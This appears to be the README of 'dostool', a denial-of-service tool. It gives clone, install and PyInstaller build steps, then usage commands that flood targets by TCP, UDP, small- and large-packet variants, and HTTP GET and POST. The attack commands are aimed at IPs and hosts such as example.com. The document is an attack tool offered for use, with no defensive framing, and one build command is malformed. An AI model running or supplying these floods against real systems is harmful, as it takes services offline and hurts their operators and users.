# Installation

## 1. Create VEnv
``` bash
python3 -m venv .venv
source ./.venv/bin/activate
```

## 2. Install
``` bash
git clone https://github.com/i4ego/dostool.git 
cd dostool
python3 -m pip install --upgrade -r req.txt
```

## 3. Build
``` bash
python3 -m --upgrade pip install pyinstaller
pyinstaller --onefile --console --clean --noconfirm \
 --distpath ./ --name dostool dostool.py
rm dostool.spec
rm -rf build
```

# Usage

## DoS by TCP 
``` dostool tcp 192.168.0.1:53 ```

## DoS by UDP
``` dostool udp example.com:443 ```

## DoS by UDP (Small packets)
``` dostool s-udp example.com:443 ```

## DoS by TCP (Large packets)
``` dostool s-tcp example.com:443 ```

# DoS by HTTP (GET)
``` dostool http-get example.com:80 ```

# DoS by HTTP (POST)
``` dostool http-post 11.11.11.11:8443 ```
